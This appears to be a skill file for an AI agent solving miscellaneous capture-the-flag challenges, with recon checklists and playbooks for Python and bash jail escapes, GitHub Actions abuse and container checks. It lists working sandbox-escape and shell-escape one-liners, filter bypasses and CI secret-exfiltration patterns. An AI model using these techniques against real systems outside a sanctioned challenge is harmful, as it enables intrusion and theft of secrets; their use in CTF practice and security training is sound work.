# ctf-misc

## Description

Miscellaneous skill — pyjails, bash jails, restricted shells, esolangs, encodings,
protocol puzzles, Docker/container quirks, CI/CD abuse, GitHub Actions challenges,
game logic, custom services, QR/barcode oddities, and tasks that do not fit cleanly
into pwn/web/reverse/crypto/forensics.

Use this skill when the problem is primarily about environment abuse, weird parser
behavior, automation, or chaining multiple lightweight techniques.

## Prerequisites

```bash
python3 -m pip install pwntools requests z3-solver sympy pillow qrcode pyzbar scapy --break-system-packages
apt-get install -y netcat-openbsd ncat socat jq curl strace ltrace git gh docker.io qrencode zbar-tools
```

## Recon Checklist

```bash
file artifacts/* 2>/dev/null || true
find . -maxdepth 3 -type f -print
grep -RniE 'flag|ctf|secret|token|password|eval|exec|system|subprocess|pickle|yaml|template|docker|github|actions|workflow' .
strings artifacts/* 2>/dev/null | grep -iE 'flag|ctf|secret|password|token' || true
```

If remote service:

```bash
ncat --ssl HOST PORT
nc HOST PORT
python3 - <<'PY'
from pwn import *
io = remote("HOST", PORT, ssl=True)
print(io.recv(timeout=2))
io.close()
PY
```

## Category Split

| Signal | Sub-skill |
|--------|-----------|
| Python jail / `eval` / blacklist | Pyjail |
| Bash/restricted shell | Shell escape |
| Dockerfile / container | Container escape / file layout |
| `.github/workflows` | CI/CD / Actions |
| QR/barcode | Barcode parser |
| weird encoding | Encoding stack |
| custom protocol | Protocol state machine |
| game/server rules | Logic bug |
| esolang | Interpreter/model extraction |

## Pyjail Playbook

Checklist:

- Is `eval` or `exec` used?
- Are builtins removed or filtered?
- Are quotes, underscores, dots, brackets blocked?
- Is input transformed before evaluation?
- Is the jail expression-only?
- Is the target to read `/flag`, environment, globals, or spawn shell?

Useful primitives:

```python
().__class__.__base__.__subclasses__()
getattr(obj, "attr")
vars(obj)
globals()
__import__("os").system("sh")
open("/flag").read()
```

When underscores blocked:

```python
# Build names dynamically using chr()
"".join(map(chr,[95,95,99,108,97,115,115,95,95]))
```

When quotes blocked:

```python
# Get strings from existing docstrings/classes/errors
```

Always test locally in a copy of the jail before remote.

## Bash Jail / Restricted Shell

```bash
echo $PATH
set
type -a sh bash cat less more vi awk sed find tar zip python perl ruby lua node
printf '%s\n' /bin/*
```

Escapes:

```bash
sh
bash -p
awk 'BEGIN{system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar --checkpoint=1 --checkpoint-action=exec=/bin/sh -cf /dev/null /dev/null
vi
less /flag
```

Bypass spaces:

```bash
cat${IFS}/flag
{cat,/flag}
$'cat\x20/flag'
```

## CI/CD / GitHub Actions

Recon:

```bash
find .github -type f -maxdepth 4 -print -exec sed -n '1,220p' {} \;
grep -RniE 'pull_request_target|workflow_run|cache|artifact|secrets|checkout|ref:|merge|upload-artifact|download-artifact' .github
```

High-risk patterns:

- `pull_request_target` checking out attacker-controlled ref
- cache restore/save with attacker-controlled key/path
- artifact poisoning between workflows
- untrusted PR running with secrets
- command injection in workflow variables
- dependency confusion in build scripts
- writable release asset / package registry path

Exploit discipline:

1. Reproduce locally or in a forked test repo first.
2. Show which workflow has secret-bearing context.
3. Trigger benign proof before exfiltrating challenge flag.
4. Capture run ID, job logs, artifact hash, and exact branch/commit.

## Docker / Container Challenges

```bash
cat Dockerfile docker-compose.yml entrypoint.sh 2>/dev/null
grep -RniE 'flag|secret|cap|privileged|volume|mount|docker.sock|setuid|sudo' .
docker build -t chall .
docker run --rm -it chall
```

Check:

- `/flag` mount path
- entrypoint privileges
- setuid binaries
- writable PATH
- cron/supervisor
- exposed ports
- Docker socket
- capabilities: `SYS_ADMIN`, `DAC_READ_SEARCH`
- procfs leaks

## Encoding Stack

Try outside-in, never assume one layer:

```bash
xxd file
base64 -d file
python3 - <<'PY'
import base64, codecs, sys
s=open("artifacts/input.txt","rb").read().strip()
for name, fn in [
 ("b64", lambda x: base64.b64decode(x)),
 ("b32", lambda x: base64.b32decode(x)),
 ("hex", lambda x: bytes.fromhex(x.decode())),
 ("rot13", lambda x: codecs.decode(x.decode(), "rot_13").encode()),
]:
    try: print(name, fn(s)[:200])
    except Exception: pass
PY
```

## Protocol State Machine

For menu/TCP services:

```python
from pwn import *
context.log_level = "debug"
io = remote("HOST", PORT, ssl=True)
print(io.recvuntil(b"> "))
io.sendline(b"1")
print(io.recv(timeout=1))
```

Build wrappers:

```python
def cmd(choice, *args):
    io.sendlineafter(b"> ", str(choice).encode())
    for a in args:
        io.sendlineafter(b": ", str(a).encode())
```

Record every successful state transition in `recon/protocol.md`.

## Verify

A misc flag is valid only when:

- It is obtained from the intended local/remote service behavior, or
- The environment-specific primitive is demonstrated, or
- The remote checker accepts it.

If the string came from test data, sample flag, or a self-created file, it is not valid.

## Pivot Rules

- Binary memory corruption becomes central → `ctf-pwn`
- Source/API route becomes central → `ctf-web`
- Cipher/math becomes central → `ctf-crypto`
- Artifact carving becomes central → `ctf-forensics`
- Heavy obfuscation/binary logic → `ctf-reverse`
